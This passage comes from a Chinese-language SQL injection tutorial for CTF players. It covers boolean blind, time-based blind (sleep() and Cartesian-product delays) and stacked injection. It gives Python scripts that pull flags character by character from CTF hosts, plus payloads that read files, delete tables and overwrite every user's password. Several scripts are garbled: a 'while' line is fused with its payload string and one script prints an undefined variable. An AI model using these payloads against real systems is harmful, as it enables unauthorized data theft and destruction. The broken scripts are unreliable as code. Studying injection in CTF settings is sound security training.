    |  1 | 2        | 5                                |
    |  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
    |  1 | 2        | 6                                |
    +----+----------+----------------------------------+
    2 rows in set (0.01 sec)
    mysql> select * from admin where username='' or 1 union select 1,2,'51' order by 3;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | 2        | 51                               |
    |  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from admin where username='' or 1 union select 1,2,'52' order by 3;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
    |  1 | 2        | 52                               |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
通过逐位判断便可得到`password`
参考脚本：
    import requests
    # 定义一个flag取值的一个“范围”
    dic = "1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&*"
    # 之所以不定义为空，而是“^”，是为了从头开始匹配
    flag = "^"
    # 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准
    url1 = "https://chall.tasteless.eu/level1/index.php?dir=|1"
    content1 = requests.get(url1).content
    # 这个flag的长度被定义为了50个字符长度
    for i in range(50):
        # 从定义的dic中挨个取1字符，拼凑payload
        for letter in dic:
            payload = flag + letter
            #该url最后的“}2b1”-->"}+1"
            url2 = "https://chall.tasteless.eu/level1/index.php?dir=|{select (select flag from level1_flag) regexp "+"'"+ payload +"'"+"}%2b1"
            print(url)
            # 获取实际注入后的排列内容
            content2 = requests.get(url2).content
            # 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）
            if(content1 != content2):
                flag = payload
                print(flag)
                break
#### 时间盲注
有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。
对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，
观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。
首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：
    1' and sleep(5)#
    1 and sleep(5)
##### 时间盲注用到的SQL语法知识
一般的时间盲注主要就是使用`sleep()`函数进行时间的延迟，然后通过if判断是否执行`sleep()`：
    admin' and if(ascii(substr((select database()),1,1))>1,sleep(3),0)#
trim配合比较。
`trim([both/leading/trailing] 目标字符串 FROM 源字符串)`
从源字符串中去除首尾/首/尾的目标字符串，如寻找字符串第一位，假定X代表某字符，`trim(leading X from 'abcd') =
trim(leading X+1 from 'abcd')`不相等，说明正确结果是X或X+1再进行`trim(leading X+1 from
'abcd') = trim(leading X+2 from 'abcd')` 相等则正确为X，不相等则X+1正确
若`trim(leading X from 'abcd') = trim(leading X+1 from
'abcd')`相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等
##### 注入流程
时间盲注我们也是利用脚本完成：
    import requests
    import json
    import time
    url = 'http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id='
    flag = ''
    for i in range(1,250):
       low = 32
       high = 128
       mid = (low+high)//2
       while(low%d),sleep(2),1)-- " %(i,mid)
           times = time.time()
           res = requests.get(url=payload)
           if time.time() - times >= 2:      # 为真时，即判断正确的时候的条件
               low = mid+1
           else:
               high = mid
           mid = (low+high)//2
       if(mid ==32 or mid ==127):
           break
       flag = flag+chr(mid)
       print(flag)
这是一个GET方式的时间盲注，更改脚本请求方式的方法可以参照上面的布尔盲注，这两个脚本的编写思路是一样的，只是在判断方式上有所区别。
时间盲注在CTF比赛和平时生产环境中都是比较常见的，但是当我们常⽤的函数被过滤的话，那该怎么办呢？还有以下几种时间盲注方式。
###### 笛卡尔积延时盲注
`count(*)` 后面所有表中的 **列笛卡尔积数** ， **数量越多越卡** ，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来
**打时间差** ，从而达到延时注入的效果：
    mysql> SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
    +-----------+
    | count(*)  |
    +-----------+
    | 113101560 |
    +-----------+
    1 row in set (2.07 sec)
    mysql> select * from ctf_test where user='1' and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);
    +------+-----+
    | user | pwd |
    +------+-----+
    | 1    | 0   |
    +------+-----+
    1 row in set (2.08 sec)
得到的结果都会有延迟。这里选用`information_schema.columns表`的原因是其内部数据较多，到时候可以根据实际情况调换。
那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：
    admin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#
    [OUTPUT:]
    HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了
给出一个笛卡尔积延时注入脚本：
    import requests
    url = 'http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login'
    flag = ''
    for i in range(1,250):
       low = 32
       high = 128
       mid = (low+high)//2
       while(low%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#" % (i, mid)
           datas = {
                    "username":"admin",
                    "password": payload
            }
           res = requests.post(url=url,data=datas,timeout=None)    # 不限制超时
           if '504 Gateway Time-out' in res.text:      # 为真时，即判断正确的时候的条件
               low = mid+1
           else:
               high = mid
           mid = (low+high)//2
       if(mid ==32 or mid ==127):
           break
       flag = flag+chr(mid)
       print(flag)
#### 堆叠注入
在SQL中，分号`;` 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？
因此这个想法也就造就了堆叠注入。
而联合注入也是将两条语句合并在一起，两者之间有什么区别么？
区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是 **查询语句** ，而堆叠注入可以执行的是任意的语句。
例如以下这个例子。用户输入：`1; DELETE FROM products;` 服务器端生成的sql语句为：`select * from products
where id=1;DELETE FROM products;` 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行， **可能受到API或者数据库引擎不支持的限制** ，当然
**权限不足** 也可以解释为什么攻击者无法修改数据或者调用一些程序。
虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用
union 联合注入。
一般存在堆叠注入的都是由于使用 `mysqli_multi_query()`
函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。
##### 堆叠注入用到的SQL语法知识
单纯看堆叠注入的话好像还真没什么了
##### 注入流程
    # 读取数据
    /?id=1';show databases;--+
    /?id=1';show tables;--+
    /?id=1';show tables from database_name;--+
    /?id=1';show columns from table_name;--+
    # 读取文件
    /?id=1';select load_file('/flag');--+
    # 修改数据表的结构
    /?id=1';insert into users(id,username,password)values(20,'whoami','657260');--+    # 插入数据
    /?id=1';update users set password='657260' where id>0;--+    # 更改数据